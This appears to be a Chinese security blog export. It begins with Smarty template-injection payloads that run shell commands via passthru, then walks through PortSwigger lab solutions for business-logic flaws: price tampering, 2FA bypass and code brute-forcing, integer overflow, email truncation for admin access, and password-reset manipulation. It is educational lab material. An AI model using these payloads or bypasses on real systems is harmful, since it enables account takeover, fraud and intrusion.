<p>其实和命令执行没什么不同。payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="number">2</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114645.png" /></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Smarty</tag>
      </tags>
  </entry>
  <entry>
    <title>business logic vulnerabilities</title>
    <url>/2023/04/13/business%20logic%20vulnerabilities/</url>
    <content><![CDATA[<p>网站：</p>
<ol type="1">
<li><a href="https://portswigger.net/web-security/logic-flaws">Business
logic vulnerabilities | Web Security Academy</a></li>
<li><a
href="https://portswigger.net/web-security/logic-flaws/examples">Examples
of business logic vulnerabilities | Web Security Academy</a></li>
</ol>
<span id="more"></span>
<h1 id="概述">1. 概述</h1>
<p>业务逻辑漏洞是应用程序设计和实现中的缺陷，允许攻击者触发意外行为。这可能使攻击者能够操纵合法功能以实现恶意目标。这些缺陷通常是由于未能预见到可能发生的异常应用程序状态而导致的，因此未能安全的处理。</p>
<p>逻辑缺陷对于那些没有明确寻找它们的人来说通常是不可见的，因为它们通常不会在应用程序的正常使用中暴露出来。但是，攻击者可能能够通过以开发人员意想不到的方式与应用程序交互来发现并利用。</p>
<p>业务逻辑的主要目的之一是执行在设计应用程序或功能时定义的规则和约束。从广义上讲，业务规则规定了应用程序在给定场景发生时应如何反应。这包括防止用户做会对业务产生负面影响或根本没有意义的事情。</p>
<p>逻辑上的缺陷可以让攻击者规避这些规则。
例如，他们可能无需完成预期的购买工作流程即可完成交易。
在其他情况下，用户提供的数据验证中断或不存在可能允许用户对事务关键值进行任意更改或提交无意义的输入。
通过将意外值传递到服务器端逻辑，攻击者可能会诱使应用程序做一些它不应该做的事情。</p>
<p>基于逻辑的漏洞可能非常多样化，并且通常是应用程序及其特定功能所独有的。
识别它们通常需要一定数量的知识，例如了解业务领域或攻击者在给定上下文中可能有什么目标。
这使得它们很难使用自动漏洞扫描器进行检测。
因此，逻辑缺陷通常是漏洞赏金猎人和手动测试人员的重要目标。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/logic-flaws.jpg" /></p>
<h1 id="导致业务逻辑漏洞的原因">2. 导致业务逻辑漏洞的原因</h1>
<p>业务逻辑漏洞的出现通常是因为设计和开发团队对用户将如何与应用程序进行交互做出了错误的假设。这些错误的假设可能导致对用户输入的验证不充分。例如，如果开发人员假设用户将专门通过
Web
浏览器传递数据，则应用程序可能完全依赖弱客户端控件来验证输入。这些很容易被攻击者使用拦截代理绕过。</p>
<p>最终，这意味着当攻击者偏离预期的用户行为时，应用程序无法采取适当的措施来阻止这种情况，因此无法安全地处理这种情况。</p>
<p>逻辑缺陷在过于复杂的系统中尤为常见，即使是开发团队自己也无法完全理解。为避免逻辑缺陷，开发人员需要从整体上理解应用程序。这包括了解如何以意想不到的方式组合不同的功能。在大型代码库上工作的开发人员可能无法深入了解应用程序的所有区域是如何工作的。在一个组件上工作的人可能会对另一个组件的工作方式做出有缺陷的假设，结果无意中引入了严重的逻辑缺陷。如果开发人员没有明确记录所做的任何假设，这些类型的漏洞很容易潜入应用程序。</p>
<h1 id="危害">3. 危害</h1>
<p>从根本上说，任何逻辑缺陷的影响都取决于它所涉及的功能。例如，如果缺陷存在于身份验证机制中，这可能会对整体安全性产生严重影响。攻击者可能会利用它来提升权限，或者完全绕过身份验证，从而获得对敏感数据和功能的访问权限。这也为其他漏洞利用增加了攻击面。</p>
<p>金融交易中有缺陷的逻辑显然会导致资金被盗、欺诈等给企业造成巨大损失。还应该注意，即使逻辑缺陷可能不会让攻击者直接受益，它们仍然可以让恶意方以某种方式破坏业务。</p>
<h1 id="例子">4. 例子</h1>
<h2 id="过度信任客户端控制">4.1. 过度信任客户端控制</h2>
<p>所谓客户端控制就是在客户端做验证，比方说之前的文件上传，在 js
代码中来验证用户上传文件的后缀是否是图片，这是一种极其危险的行为，因为用户可以使用诸如
burpsuite 等工具在通过 js
验证后修改数据，这样一来，客户端验证就失去了作用。</p>
<p>靶场1：<a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls">Lab:
Excessive trust in client-side controls | Web Security Academy</a></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities.png" /></p>
<p>进去之后会看到上图的界面，需要先登录，然后购买第一个产品，第一个产品的价格是
<code>1337.00</code>，而我们的账户只有
<code>99.99</code>，显然无法购买。</p>
<p>将产品 <code>add to cart</code> 时抓取流量包：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-1.png"
alt="business logic vulnerabilities-2" />
<figcaption aria-hidden="true">business logic
vulnerabilities-2</figcaption>
</figure>
<p>注意这里的价格
<code>133700</code>，我们尝试修改这里的数值，然后去购物车查看，这里修改为
1，然后</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-2.png"
alt="business logic vulnerabilities-2" />
<figcaption aria-hidden="true">business logic
vulnerabilities-2</figcaption>
</figure>
<p>价格被成功修改，此时就可以购买了。打开第一个产品的
<code>view detail</code> 界面，查看源代码，注意如下代码段：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-3.png"
alt="business logic vulnerabilities-2" />
<figcaption aria-hidden="true">business logic
vulnerabilities-2</figcaption>
</figure>
<p>这就是我们 <code>add to cart</code>
时提交的数据，可以看到，这里将价格写死在 <code>html</code>
中，也就是前端来控制价格，被我们使用 burp 绕过了。</p>
<hr />
<p>靶场2： <a
href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic">Lab:
2FA broken logic | Web Security Academy</a></p>
<p>首先使用给的 <code>wiener:peter</code> 登录，并使用 burp
记录这过程的所有流量。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-4.png" /></p>
<p>查看其中两个数据包，左边是发送验证码的数据包，右边是登录成功后的数据包，注意到两边的
session 值是不同的，因此有理由推测“验证码”可能在另一个 session
文件中，而该文件里面对于该验证码是发给谁的应该是通过用户名判断的，这一点可以从短信接收页面看出来。</p>
<p>那么思路就很清楚了：</p>
<ol type="1">
<li>找到用户向客户端请求验证码的数据包（就是
<code>GET /login2</code>）；</li>
<li>把 <code>GET /login2</code> 里面的 cookie 中的 <code>verify</code>
设置为 <code>carlos</code>，并发送该数据包，此时后台应该会给
<code>carlos</code> 的邮箱发送一个验证码，但我们不知道值是多少；</li>
<li>然后将 <code>POST /login2</code> 数据包对验证码，也就是
<code>mfa-code</code> 参数进行爆破，根据上图可知道，当验证码正确时返回
302，（经过尝试，验证码失败返回 200）；</li>
</ol>
<p>需要注意，上面的过程中需要保证两个数据包的 <code>session</code>
值相同。我们先登录 <code>wiener</code> 账号，然后使用这过程中产生的
<code>GET /login2</code> 和 <code>POST /login2</code>。</p>
<p><code>GET /login2</code> 数据包：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-5.png" /></p>
<p><code>POST /login2</code> 数据包：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-6.png" /></p>
<p>最终爆破的结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-7.png" /></p>
<p>最后一步，使用 burp
再次拦截一下提交验证码的数据包（<code>POST /login2</code>），然后将爆破成功的整个数据包的内容复制进去，然后发送，最后成功在网页进入
<code>carlos</code> 账号，点击 <code>My account</code>
即可通关。（我这里已经通关了，就没法看邮箱，所以演示最后一步）。</p>
<p>我认为本靶场漏洞最大的因素应该是登录和验证码两者没有关联，两者的
session
文件分开，并且验证码验证是哪个用户请求时使用的是用户名，而用户名是可以被修改的。</p>
<p>防御措施：</p>
<p>将两者的 session
文件关联起来，比如说最开始输入了用户名和密码，给了一个
sessionid，那么在验证码验证的 seesion 文件中携带这个
sessionid，用户提交验证码时不仅验证验证码是否正确，还验证 sessionid
是否正确，就不要去验证用户名了。</p>
<p>而 sessionid 与前一步的登录绑定，那就登录 sessionid 对应的 session
文件的用户。</p>
<h2 id="无法处理非常规输入">4.2. 无法处理非常规输入</h2>
<p>应用程序逻辑的一个目标是将用户输入限制为符合业务规则的值。例如，应用程序可能被设计为接受某种数据类型的任意值，但从业务的角度来看，逻辑决定了这个值是否可以接受。许多应用程序将数字限制纳入其逻辑。这可能包括旨在管理库存、应用预算限制、触发供应链阶段等的限制。</p>
<p>让我们以在线商店为例。订购产品时，用户通常会指定他们想要订购的数量。尽管理论上任何整数都是有效输入，但业务逻辑可能会阻止用户订购比当前库存更多的单位。要实施这样的规则，开发人员需要预测所有可能的场景，并将处理这些场景的方法整合到应用程序逻辑中。换句话说，他们需要告诉应用程序它是否应该允许给定的输入以及它应该如何根据各种条件做出反应。如果没有明确的逻辑来处理给定的情况，这可能会导致意外和潜在的可利用行为。</p>
<p>例如，数字数据类型可能接受负值。根据相关功能，业务逻辑允许这样做可能没有意义。但是，如果应用程序没有执行足够的服务器端验证并拒绝此输入，攻击者可能会传递一个负值并引发不需要的行为。</p>
<p>考虑两个银行账户之间的资金转账。此功能几乎肯定会在完成转账之前检查发件人是否有足够的资金：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$transferAmount</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;amount&#x27;</span>];</span><br><span class="line"><span class="variable">$currentBalance</span> = <span class="variable">$user</span>-&gt;getBalance();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$transferAmount</span> &lt;= <span class="variable">$currentBalance</span>) &#123;</span><br><span class="line">    <span class="comment">// Complete the transfer</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Block the transfer: insufficient funds</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，如果逻辑不能充分阻止用户在金额参数中提供负值，攻击者可能会利用这一点来绕过余额检查并向“错误”方向转移资金。如果攻击者向受害者的账户发送了
-1000 美元，这可能会导致他们从受害者那里收到 1000 美元。该逻辑将始终评估
-1000 小于当前余额并批准转账。</p>
<p>在审核应用程序时，应该使用 Burp Proxy 和 Repeater
等工具来尝试提交非常规值。特别是，尝试在合法用户不太可能输入的范围内输入。这包括异常高或异常低的数字输入以及基于文本的字段的异常长字符串。您甚至可以尝试意想不到的数据类型。通过观察应用程序的响应，您应该尝试回答以下问题：</p>
<ol type="1">
<li>是否对数据施加了任何限制？</li>
<li>达到这些限制时会发生什么？</li>
<li>是否对输入进行了任何转换或规范化？</li>
</ol>
<p>这可能会暴露弱输入验证，使您能够以不寻常的方式操作应用程序。请记住，如果在目标网站上发现一种无法安全处理非常规输入的表单，则其他表单很可能会遇到同样的问题。</p>
<p>靶场 1：<a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level">Lab:
High-level logic vulnerability | Web Security Academy</a></p>
<p>进入环境先登录
<code>wiener:peter</code>，然后购买第一个物品，与之前不同的是，这里把
<code>price</code> 变成了 <code>quantity</code>，</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-8.png" /></p>
<p>经过尝试，无法修改成小数，但可以修改成负数，我修改成了
-1，然后提交请求，最后来到购物车查看：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-9.png" /></p>
<p>但此时无法购买，提示 <code>Total</code>
不能为负数，因此就买一些其他物品凑成正数，然后购买：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-10.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-11.png" /></p>
<p>原来它是要求正常价格买 jacket，那就一样的操作，先选
<strong>负几件其他物品</strong>，然后正常把一件 jacket
加入购物车，只要总价格小于拥有的价格就好，成功通关。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-12.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-13.png" /></p>
<p>就像前面说的一样，从业务逻辑上来看，购买物品的数量除了不能为
0，这没有意义，也不能为负数，这会造成购买物品反而赚钱的错误业务逻辑。</p>
<hr />
<p>靶场 2：<a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level">Lab:
Low-level logic flaw | Web Security Academy</a></p>
<p>该靶场和之前一样，但加了限制：</p>
<ol type="1">
<li>数量的值被限制在 <code>[0,99]</code>，且只能为整数；</li>
<li>如果构成车出现一件物品的数量小于等于 0，就会自动删除；</li>
</ol>
<p>根据提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You will need to use Burp Intruder (or Turbo Intruder) to solve this lab.</span><br><span class="line"></span><br><span class="line">To make sure the price increases in predictable increments, we recommend configuring your attack to only send one request at a time. In Burp Intruder, you can do this from the resource pool settings using the **Maximum concurrent requests** option.</span><br></pre></td></tr></table></figure>
<p>应该是利用数字在计算机中的存储是存在上限的，以 16
位存储举例，正整数的最大值为 <code>0x7fff</code>，一旦超过这个数，比如说
<code>0x8fff</code>，它的二进制为
<code>1000 1111 1111</code>，而第一位在数字中是符号位，0 为正数，1
位负数，所以一旦超上限，数就会一下跳到负数，然后再一直增加。</p>
<p>这里利用的就是这个原理，但是不知道上限是多少，所以使用
<code>burp</code> 爆破，每次只能加 99，设置如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-14.png" /></p>
<p>在不知道请求了几次之后，终于出现了负数：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-15.png" /></p>
<p>经过测试，当数量达到 <code>16062</code> 第一次出现负值：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-16.png" /></p>
<p>如果把小数点去掉，这个数和 <code>7fffffff</code>
（2147483647）很接近，通过补码换算</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-17.png" /></p>
<p>发现上限就是
<code>7fffffff</code>。那接下来只要使用堆砌其他物品的数量使总的价格维持在：<span
class="math inline">\(-133700 &lt; total &lt;-123700\)</span>
，然后再把一件 jacket 加入构成就可以购买。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-18.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-19.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-20.png" /></p>
<hr />
<p>靶场3： <a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input">Lab:
Inconsistent handling of exceptional input | Web Security
Academy</a></p>
<p>这题确实没想到，看了提示也想不到，是这样的，该靶场漏洞的起因是长度，后台会对邮箱的长度进行截取。</p>
<p>第一步，注册一个账号，邮箱格式：<code>大于255的字符串@YOUR-EMAIL-ID.web-security-academy.net</code>，这里大于
255 的字符串最好有点规律，我这里是
<code>abcde*255</code>，然后在邮箱里确认注册，登录进入
<code>My account</code>：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-21.png" /></p>
<p>发现邮箱长度截取了输入的前 255 个字符。</p>
<p>第二步，可以根据官网的 solution 利用 burpsuite
发现，或者其他目录爆破的方式得到一个路径
<code>/admin</code>，访问得到如下结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-22.png" /></p>
<p>在注册的时候有提示，如果是 <code>DontWannaCry</code>
的员工，则需要使用它们的邮箱，结合这里的判断可以知道，使用
<code>DontWannaCry</code> 邮箱的用户应该都是管理员。</p>
<p>第三步，利用邮箱截取前 255
个字符串的特性，重新注册一个账号，邮箱为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">长字符串@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net</span><br></pre></td></tr></table></figure>
<p>其中 <code>长字符串@dontwannacry.com</code> 部分正好长度为
255，这样的一个注册信息能够在邮箱中看到，确认注册登录后可以发现：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-23.png" /></p>
<p>从该页面看，该账户的注册邮箱就是 <code>DontWannaCry</code>
的，因此该账户有权限访问 <code>/admin</code>。</p>
<p>最后一步，访问 <code>/admin</code>，删除 <code>carlos</code>
账号：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-24.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-25.png" /></p>
<p>这里的成因是两个地方的邮箱长度起冲突了：</p>
<ol type="1">
<li>注册时候，邮箱长度不限制，因此可以利用
<code>xxx.YOUR-EMAIL-ID.web-security-academy.net</code>
使注册信息发送到我们的邮箱；</li>
<li>注册成功后，写入数据库的邮箱长度有限制，因此注册成功后，真正写入数据库的用户的邮箱就是前
255 个字符；</li>
</ol>
<p>这两个地方的逻辑应该统一，注册时就应该限制长度。</p>
<h2 id="对用户行为做出错误的假设">4.3. 对用户行为做出错误的假设</h2>
<p>逻辑漏洞最常见的根本原因之一是对用户行为做出错误的假设。这可能导致开发人员没有考虑违反这些假设的潜在危险场景的广泛问题。在本节中，我们将提供一些应避免的常见假设的警示示例，并演示它们如何导致危险的逻辑缺陷。</p>
<h3 id="受信任的用户并不总是值得信赖">4.3.1.
受信任的用户并不总是值得信赖</h3>
<p>应用程序可能看起来是安全的，因为它们实施看似可靠的措施来执行业务规则。不幸的是，一些应用程序错误地认为，在最初通过了这些严格的控制后，用户及其数据可以无限期地被信任。这可能导致从那时起对相同控制的执行相对松懈。</p>
<p>如果业务规则和安全措施没有在整个应用程序中一致应用，这可能会导致潜在的危险漏洞，攻击者可能会利用这些漏洞。</p>
<p>靶场：<a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls">Lab:
Inconsistent security controls | Web Security Academy</a></p>
<p>任务也是删除 <code>carlos</code>
用户，经过上一个靶场的“折磨”，能够推出：存在 <code>/admin</code>。</p>
<p>类似的，先注册一个用户，提示和上一个靶场一样，<code>dontwannacry</code>
邮箱注册时管理员。使用
<code>string@YOUR-EMAIL-ID.web-security-academy.net</code>
邮箱注册，激活，登录看到这样的界面：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-26.png" /></p>
<p>可以直接使用 <code>Update email</code>
功能更新自己的邮箱，上图就是我更新之后的样子。</p>
<p>最后访问 <code>/admin</code>，删除 <code>carlos</code>：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-27.png" /></p>
<p>这里就很好解释了
“在最初通过了这些严格的控制后，用户及其数据可以无限期地被信任。这可能导致从那时起对相同控制的执行相对松懈。”这句话。最开始注册的时候对邮箱做了限制，等注册成功了，对注册用户过于信任，就连更换邮箱也不用验证一下新邮箱，而是直接更换，这就是漏洞成因。</p>
<h3 id="用户不会总是提供强制输入">4.3.2. 用户不会总是提供强制输入</h3>
<p><strong>一种误解是用户总是会为必填输入字段提供值</strong>。浏览器（前端）可能会阻止普通用户在没有必要输入的情况下提交表单，但正如我们所知，攻击者可以篡改传输中的参数。这甚至扩展到完全删除参数。</p>
<p>在同一个服务器端代码存在多个函数的情况下，这是一个特殊的问题。在这种情况下，特定参数的存在或不存在可以决定执行哪个代码。删除参数值可能允许攻击者访问本应无法访问的代码路径。</p>
<p>在探测逻辑缺陷时，应该尝试依次删除每个参数并观察这对响应有何影响。应该确保：</p>
<ol type="1">
<li>一次只删除一个参数以确保到达所有相关代码路径（控制变量法）。</li>
<li>尝试删除参数的名称和值。服务器通常会以不同方式处理这两种情况。</li>
<li>遵循多阶段流程直至完成。有时，在一个步骤中篡改参数会影响工作流程中的另一个步骤。</li>
</ol>
<p>这适用于 URL 和 POST 参数，但不要忘记也检查
cookie。这个简单的过程可以揭示一些可能被利用的奇怪的应用程序行为。</p>
<p>靶场 ：<a
href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic">Lab:
Password reset broken logic | Web Security Academy</a></p>
<p>目标：利用密码重置功能修改 <code>carlos</code>
的密码，并且登录该账户访问 <code>My account</code> 界面。</p>
<p>先尝试使用 <code>wiener:peter</code> 登录，发现只有
<code>Update email</code> 的功能，没有密码重置，那么只可能在
<code>forgot password</code> 功能点。</p>
<p>测试该功能点，输入
<code>wiener</code>，然后邮箱收到一封邮件，点击让我们输入新的密码，这一切流程结束后就可以使用新的密码登录。</p>
<p>查看这一流程的流量情况，其实只有两个地方能做文章：</p>
<ol type="1">
<li>输入用户名时；</li>
<li>输入新的密码时；</li>
</ol>
<p>如果修改了前者，那么 <code>carlos</code>
的邮箱我们并不知道，因此先查看输入新密码那个数据包，发现由以下参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">temp-forgot-password-token=fiUaMtLvFfBUp0ebVGLwnTNKicBbWUjR&amp;username=wiener&amp;new-password-1=123456&amp;new-password-2=123456</span><br></pre></td></tr></table></figure>
<p>尝试将 <code>username</code> 修改为
<code>carlos</code>，发现成功修改：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-28.png" /></p>
<p>使用 <code>carlos:123456</code> 登录成功：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-29.png" /></p>
<p>“用户不会总是提供强制输入”理解：</p>
<ul>
<li>强制输入“”就是修改密码这个请求包中的用户名
<code>username=wiener</code>
就是强制输入，不是用户输入的，而是前端自动提供的；</li>
<li>因此这句话就是浏览器的强制输入用户并不买账，可能会去修改这些强制输入的参数从而达到恶意目标；</li>
</ul>
<hr />
<p>靶场：<a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint">Lab:
Weak isolation on dual-use endpoint | Web Security Academy</a></p>
<p>目标：登录 <code>administrator</code> 用户并删除
<code>carlos</code>。</p>
<p>注意两个地方：</p>
<ol type="1">
<li>靶场标题：Weak isolation on dual-use endpoint；</li>
<li>This lab makes a flawed assumption about the user's privilege level
based on their input.</li>
</ol>
<p>我们先使用 <code>wiener:peter</code> 登录，发现只有两个功能：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-30.png" /></p>
<p>修改邮箱没有用，那么只可能是 <code>Change password</code> 功能。</p>
<p>正常使用没有问题，如果我们将 <code>username</code> 修改为
<code>administrator</code>，会提示 <code>current password</code>
不正确。是否意味着：如果 <code>current password</code> 正确，能够在
<code>wiener</code> 的登录界面修改 <code>administrator</code>
的密码？结合题目的
<code>dual-use endpoint</code>，更加让我坚信，这里肯定存在漏洞。</p>
<p>四个参数，<code>username=administrator</code>，<code>new password</code>
和 <code>confirm new password</code> 都是 <code>administrator</code>
新的密码，我们不知道
<code>current password</code>，我尝试了不填以及其他操作都不行，结果答案是把整个参数删掉：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-31.png" /></p>
<p>这不就验证了
“尝试删除参数的名称和值。服务器通常会以不同方式处理这两种情况。”。</p>
<p>使用修改后的密码登录 <code>administrator</code>，然后访问
<code>/admin</code>，并删除 <code>carlos</code>：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-32.png" /></p>
<h3 id="用户不会总是遵循预期的顺序">4.3.3.
用户不会总是遵循预期的顺序</h3>
<p>许多事务依赖于由一系列步骤组成的预定义工作流。 Web
界面通常会引导用户完成此过程，每次他们完成当前步骤时都会将他们带到工作流程的下一步。但是，攻击者不一定会遵守这个预期的顺序。不考虑这种可能性可能会导致危险的缺陷，这些缺陷可能相对容易被利用。</p>
<p>例如，许多实施双因素身份验证 (2 FA)
的网站要求用户先在一个页面上登录，然后再在单独的页面上输入验证码。假设用户将始终遵循此过程直至完成，因此不验证他们是否这样做，可能会让攻击者完全绕过
2 FA 步骤。</p>
<p>靶场 1：<a
href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass">Lab:
2FA simple bypass | Web Security Academy</a></p>
<p>首先使用 <code>wiener:peter</code> 尝试登录，发现流程如下：</p>
<ol type="1">
<li><code>POST /login</code>，输入用户名和密码；</li>
<li><code>POST /login2</code>，输入验证码；</li>
<li><code>GET /my-account</code>，用户界面；</li>
</ol>
<p>我们不知道 <code>carlos</code> 的邮箱自然也就不知道
<code>carlos</code> 的验证码，因此可以这样操作：</p>
<ol type="1">
<li><code>POST /login</code>，输入 <code>carlos:montoya</code>；</li>
<li>直接 url 输入
<code>/my-account</code>，发现可以直接跳转到页面；</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-36.png" /></p>
<p>我这里傻了，一直以为先登录
<code>wiener</code>，验证码不输入，然后登录
<code>carlos</code>，输入刚刚获得的验证码。</p>
<p>该漏洞的成因很简单，网站设计者认为用户会一步一步跟着流程来，谁知道用户直接跳过流程。如果一定要跟着流程了，一定要保证前一步完成了才能进行下一步。</p>
<p>即使在相同的工作流程或功能中，对事件顺序做出假设也会导致范围广泛的问题。使用像
Burp Proxy 和 Repeater
这样的工具，一旦攻击者看到一个请求，他们就可以随意重放它并使用强制浏览以他们想要的任何顺序与服务器执行任何交互。这允许他们在应用程序处于意外状态时完成不同的操作。</p>
<p>要识别这些类型的缺陷，应该使用强制浏览以非预期的顺序提交请求。例如，您可以跳过某些步骤、多次访问单个步骤、返回到前面的步骤等等。注意如何访问不同的步骤。虽然您通常只是向特定
URL 提交 GET 或 POST 请求，但有时您可以通过向同一 URL
提交不同的参数集来访问步骤。与所有逻辑缺陷一样，尝试确定开发人员所做的假设以及攻击面所在的位置。然后，您可以寻找违反这些假设的方法。</p>
<p>请注意，这种测试通常会导致异常，因为预期变量具有空值或未初始化的值。以部分定义或不一致的状态到达某个位置也可能导致应用程序抱怨。在这种情况下，一定要密切注意您遇到的任何错误消息或调试信息。这些可能是信息泄露的宝贵来源，可以帮助您微调攻击并了解有关后端行为的关键细节。</p>
<p>靶场 2：<a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation">Lab:
Insufficient workflow validation | Web Security Academy</a></p>
<p>首先，我们要关注一下购买商品的流程：</p>
<ol type="1">
<li>选择商品加入购物车；</li>
<li>来到购物车点击 <code>place order</code>；</li>
<li>首先发送一个请求：<code>POST /cart/checkout</code>；</li>
<li>然后收到服务端的响应，一般分为两种：
<ol type="1">
<li>如果钱购买，则：<code>Location: /cart/order-confirmation?order-confirmed=true</code>，这里其实钱就已经扣了；</li>
<li>如果钱不够买，则：<code>Location: /cart?err=INSUFFICIENT_FUNDS</code>；</li>
</ol></li>
<li>如果是第一种，则会进一步访问
<code>GET /cart/order-confirmation?order-confirmed=true</code>，该请求结束后，购买成功；</li>
<li>如果是第二种，则会访问
<code>GET /cart?err=INSUFFICIENT_FUNDS</code>，提示购买失败；</li>
</ol>
<p>因此本题的切入点就是购买的第一个请求，我们直接买 jacket，点击
<code>place order</code>，对于第一个请求我们要拦截响应，即：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-37.png" /></p>
<p>拦截响应后，将其修改为如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-38.png" /></p>
<p>然后发送第二个请求：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-39.png"
alt="business logic vulnerabilities-39" />
<figcaption aria-hidden="true">business logic
vulnerabilities-39</figcaption>
</figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-40.png" /></p>
<p>该漏洞的主要原因还是出在购买的两个请求流程，第二个请求没有验证，根据
url 中是 <code>/cart?err=INSUFFICIENT_FUNDS</code> 还是
<code>cart/order-confirmation?order-confirmed=true</code>
来判断，而这两个值虽然取决于 <code>/cart/checkout</code>
的结果，但在发送第二个请求时可以人为修改，导致服务器根据 url
判断这笔订单应该通过。</p>
<hr />
<p>靶场 3：<a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine">Lab:
Authentication bypass via flawed state machine | Web Security
Academy</a></p>
